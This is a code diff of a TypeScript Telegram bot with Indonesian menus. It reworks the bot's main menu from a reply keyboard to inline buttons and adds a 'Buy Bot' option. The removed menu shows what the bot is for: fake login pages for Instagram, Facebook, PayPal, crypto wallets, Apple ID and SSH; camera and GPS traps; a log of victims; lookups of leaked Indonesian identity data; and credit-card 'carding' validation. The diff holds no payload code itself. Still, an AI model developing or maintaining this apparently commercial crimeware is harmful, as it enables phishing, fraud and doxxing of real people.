@@ -1579,14 +1579,21 @@ There are no background services or permissions associated.
         const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
         const startMsgText = getStartMsg(safeName);
         
+        const msgOptions = {
+            parse_mode: 'HTML' as const,
+            reply_markup: {
+                remove_keyboard: true,
+                inline_keyboard: mainReplyKeyboard.reply_markup.inline_keyboard
+            }
+        };
+
         try {
             await ctx.replyWithPhoto('https://i.ibb.co.com/jP7f9D0X/a2f7c006764beac4fbdbd57b28dbb3da.jpg', {
                 caption: startMsgText,
-                parse_mode: 'HTML',
-                ...mainReplyKeyboard
+                ...msgOptions
             });
         } catch (e) {
-             ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainReplyKeyboard });
+             ctx.reply(startMsgText, msgOptions);
         }
     });
 
@@ -1609,36 +1616,13 @@ There are no background services or permissions associated.
                `© JeeMikko - Hak Cipta Dilindungi`;
     };
     
-    const mainReplyKeyboard = Markup.keyboard([
-      ['🔒 AKSES STANDAR 🔒'],
-      ['── 🔍 LAYANAN PENCARIAN DATA ──'],
-      ['🖨️ Cek Kartu Keluarga [TRIAL]', '🆔 Cek NIK [TRIAL]', '🔍 Cek Data Bocor'],
-      ['🚗 Cek Plat Nopol', '👨‍💼 Cek NIP/ASN', '🏢 Cek NIB Bisnis'],
-      ['🎓 Cek SIVIL Ijazah', '⚖️ Putusan Mahkamah', '🏛️ Cek Pajak PBB'],
-      ['🚔 Cek DPO Polri', '🛂 Cek Paspor', '🛑 Cekal Imigrasi'],
-      ['🗳️ Cek DPT KPU', '📜 Cek Sertipikat BPN', '📦 Cek Bea Cukai'],
-      ['🏦 Cek OJK Hukum', '💼 Cek Perusahaan AHU', '💍 Cek Buku Nikah'],
-      ['── 🕵️ GLOBAL OSINT ──'],
-      ['🧠 Intelligence Correlator', '🌐 IP Geolocation Tracker', '📡 Reverse IP Lookup'],
-      ['🔎 WHOIS Domain', '🌍 DNS Records Lookup', '🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
-      ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker', '📞 Phone Tracker (HLR)'],
-      ['💻 MAC Address OSINT', '🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
-      ['── 🛑 TRAP & LOGGER ──'],
-      ['📸 Request Camera Trap', '📍 Request GPS Trap'],
-      ['🎣 Fake Login IG/Meta', '💬 Fake Login FB/Messenger', '💼 Fake Login LinkedIn'],
-      ['💰 Fake Login Crypto/Wallet', '💳 Fake Login PayPal', '🛒 Fake Login Amazon/Toko'],
-      ['🎮 Fake Login Steam', '🍎 Fake Login AppleID', '🐧 Fake Login Linux/SSH'],
-      ['🎵 Fake Login Spotify/Netflix', '📁 Fake Login GDrive/Dropbox', '🛡️ Trap Bypass Cloudflare'],
-      ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
-      ['── 🛠️ ADVANCED CYBER TOOLS ──'],
-      ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode', '💳 Cek Info BIN Card'],
-      ['💳 Validasi CC (Carding)', '🧪 XSS Scanner', '🦠 VirusTotal Web/File Scan'],
-      ['── 🧩 UTILITAS & MEDIA ──'],
-      ['🎵 Download Lagu/Audio', '🎥 Download Video (IG/TikTok)', '🌤️ Info Cuaca Area'],
-      ['⏰ Sistem Alarm Pengingat', '📈 Info Harga Crypto (Live)', '📲 Koneksi Bot WhatsApp'],
-      ['── 💀 PRO FITUR ──'],
-      ['💀 SANTO PETRUS (TAKEDOWN)', 'ℹ️ Informasi Bot & Bantuan']
-    ]).resize();
+    const mainReplyKeyboard = Markup.inlineKeyboard([
+      [Markup.button.callback('🕵️ OSINT & Tracker', 'menu_osint_basic'), Markup.button.callback('🗣️ Advanced Stealth Log', 'menu_logger')],
+      [Markup.button.callback('🛠️ Adv Tools', 'menu_tools'), Markup.button.callback('🎮 Mini Games', 'menu_games')],
+      [Markup.button.callback('🎵 Media Downloader', 'menu_media'), Markup.button.callback('⏰ Alarm System', 'menu_alarm')],
+      [Markup.button.callback('📲 WhatsApp Bot', 'menu_wa'), Markup.button.callback('📱 QR Generator', 'menu_qr')],
+      [Markup.button.callback('ℹ️ Bot Info', 'menu_help'), Markup.button.callback('🛒 Buy Bot', 'menu_buy_bot')]
+    ]);
 
     // Global Error Handler for "Anti Bug"
     bot.catch((err, ctx) => {
@@ -1739,6 +1723,7 @@ There are no background services or permissions associated.
             return ctx.reply("⚠️ <b>VERIFIKASI SISTEM</b> ⚠️\n\nUntuk mengakses bot ini, Anda harus menyetujui syarat dan ketentuan penggunaan.\n\nLanjutkan?", {
                 parse_mode: 'HTML',
                 reply_markup: {
+                    remove_keyboard: true,
                     inline_keyboard: [
                         [{ text: "✅ Saya Setuju & Gabung", callback_data: "confirm_verified" }]
                     ]
@@ -1748,22 +1733,45 @@ There are no background services or permissions associated.
         
         const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
         const txt = getStartMsg(safeName);
+        
+        const msgOptions = {
+            parse_mode: 'HTML' as const,
+            reply_markup: {
+                remove_keyboard: true,
+                inline_keyboard: mainReplyKeyboard.reply_markup.inline_keyboard
+            }
+        };
+
         try {
             await ctx.replyWithPhoto('https://i.ibb.co.com/jP7f9D0X/a2f7c006764beac4fbdbd57b28dbb3da.jpg', {
                 caption: txt,
-                parse_mode: 'HTML',
-                ...mainReplyKeyboard
+                ...msgOptions
             });
         } catch (e) {
-            await ctx.reply(txt, { parse_mode: 'HTML', ...mainReplyKeyboard });
+            await ctx.reply(txt, msgOptions);
         }
     });
 
-    bot.action('menu_main', (ctx) => {
+    bot.action('menu_main', async (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
       const txt = getStartMsg(safeName);
-      ctx.editMessageText(txt, { parse_mode: 'HTML' }).catch(() => {});
+      const msgOptions = {
+            parse_mode: 'HTML' as const,
+            reply_markup: {
+                remove_keyboard: true,
+                inline_keyboard: mainReplyKeyboard.reply_markup.inline_keyboard
+            }
+        };
+      try {
+          await ctx.deleteMessage().catch(() => {});
+          await ctx.replyWithPhoto('https://i.ibb.co.com/jP7f9D0X/a2f7c006764beac4fbdbd57b28dbb3da.jpg', {
+              caption: txt,
+              ...msgOptions
+          });
+      } catch (e) {
+          ctx.reply(txt, msgOptions).catch(() => {});
+      }
     });
 
     bot.action('menu_osint_basic', (ctx) => {
@@ -4578,8 +4586,8 @@ There are no background services or permissions associated.
       }
 
       // Fallback for old keyboard buttons or UI headers
-      if (typeof text === 'string' && (text.includes('──') || text.includes('OSINT') || text.includes('Cek Data') || text.includes('Tracker') || text.includes('Phishing') || text.includes('Bantuan') || text.includes('Kamera'))) {
-         return ctx.reply("🔄 <b>Sistem Diperbarui</b>\n\nMemuat ulang Terminal UI ke versi terbaru... Silakan pilih menu dari UI baru di bawah ini.", { parse_mode: 'HTML', ...mainReplyKeyboard });
+      if (typeof text === 'string' && (text.includes('──') || text.includes('Kamera') || text.includes('Tracker') || text.includes('Phishing') || text.includes('Cek '))) {
+         return ctx.reply("🔄 <b>Sistem Diperbarui</b>\n\nUntuk memuat ulang opsi menu yang sudah lama Anda gunakan atau membuka UI baru dengan inline button. Kami merubah tata letaknya namun masih dapat diakses. Menu utama di bawah.", { parse_mode: 'HTML', ...mainReplyKeyboard, reply_markup: { remove_keyboard: true, inline_keyboard: mainReplyKeyboard.reply_markup.inline_keyboard } });
       }
 
       return next();
